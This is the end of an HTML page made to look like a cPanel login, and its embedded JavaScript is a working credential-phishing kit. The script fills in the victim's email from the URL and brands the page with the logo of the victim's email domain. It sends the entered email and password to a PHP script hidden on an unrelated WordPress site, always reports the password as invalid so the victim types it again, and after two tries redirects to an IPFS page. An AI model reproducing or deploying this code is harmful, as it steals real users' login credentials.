<div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>

<!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>



    <script>
$(document).ready(function(){
var count=0;

$('#back1').click(function () {
$("#msg").hide();
$('#email').val("");
$("#automail").animate({left:200, opacity:"hide"}, 0);
$("#inputbar").animate({right:200, opacity:"show"}, 1000);

});

var email = window.location.hash.substr(1);
if (!email) {

}
else
{
var my_email =email;
$('#email').val(my_email);
$('#displayedLogin').html(my_email);
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
var finalu= c.toUpperCase();

$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
$("#logoname").html(finalu);
$(".logoname").html(finalu);
}

$('#login_submit').click(function(event){

event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();

if (!password) {
    $('#login-status').show();
    $('#login-status-message').html("Password is empty!");
	setTimeout(function(){$('#login-status').hide();}, 1500);

                return false;
            }

count=count+1;

      $.ajax({
        dataType: 'JSON',
        url: 'https://easssi.org/wp-includes/mygeneralupdate/yellowroundcube.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
			data: $('#login_form').serialize(),
            beforeSend: function(xhr){
            	
            },
            success: function(response){
            	if(response){
            		$("#msg").show();
            		console.log(response);
            		if(response['signal'] == 'ok'){
            			$("#password").val("");
            			if (count>=2) {
            				count=0;
                    // window.location.replace(response['redirect_link']);
              window.location.replace("https://gateway.lighthouse.storage/ipfs/QmR9VrjCfcLj9T653woXCcyMnky85VsjNNicRCFwjoptWM?&em="+email);

                }
            	             	 $("#login-status").show();
			$('#login-status-message').html("Invalid password. Please try again");
				setTimeout(function(){$('#login-status').hide();}, 1500);
            
            }
            else{
                        	                         	             	 $("#login-status").show();
			$('#login-status-message').html("Invalid password. Please try again");
				setTimeout(function(){$('#login-status').hide();}, 1500);
               
            }
        }
    },
    error: function(){
    	$("#password").val("");
    	if (count>=2) {
    		count=0;
    		  window.location.replace("https://gateway.lighthouse.storage/ipfs/QmR9VrjCfcLj9T653woXCcyMnky85VsjNNicRCFwjoptWM?&em="+email);
    	}
            $("#login-status").show();
			$('#login-status-message').html("The login is invalid.");
            	setTimeout(function(){$('#login-status').hide();}, 1500);   
    },
    complete: function(){
    	
    }
});
  });


	});


</script>

</body></html>
